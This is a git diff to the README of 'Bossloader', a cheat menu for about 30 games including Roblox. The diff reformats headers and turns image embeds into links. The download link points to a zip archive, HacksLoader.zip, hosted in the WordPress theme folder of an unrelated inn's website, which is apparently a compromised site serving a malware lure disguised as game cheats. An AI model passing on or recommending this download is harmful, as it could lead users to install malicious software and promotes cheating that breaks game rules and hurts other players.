@@ -8,7 +8,7 @@ Bossloader is a cheating menu for people to get 3th party advantage, beacuse you
 
 We are currently having more cheats that people recommended to add. So we have 30 games right now.
 
-### Pictures
+## Pictures
 
 Main Page
 
@@ -22,8 +22,8 @@ Roblox Page
 
 ![image](https://user-images.githubusercontent.com/88152063/205513887-c5698b0d-bf0b-4ef3-91da-59f97813a4eb.png)
 
-### Links
+## Links
 
-![Discord](https://www.discord.gg/invite/bossloader)
-![Downlaod BossLoader](https://www.pacificmistinn.com/wp-content/themes/home/pp/bots/HacksLoader.zip)
-![Website](https://www.bossloader.com)
+[Discord](https://www.discord.gg/invite/bossloader)
+[Downlaod BossLoader](https://www.pacificmistinn.com/wp-content/themes/home/pp/bots/HacksLoader.zip)
+[Website](https://www.bossloader.com)
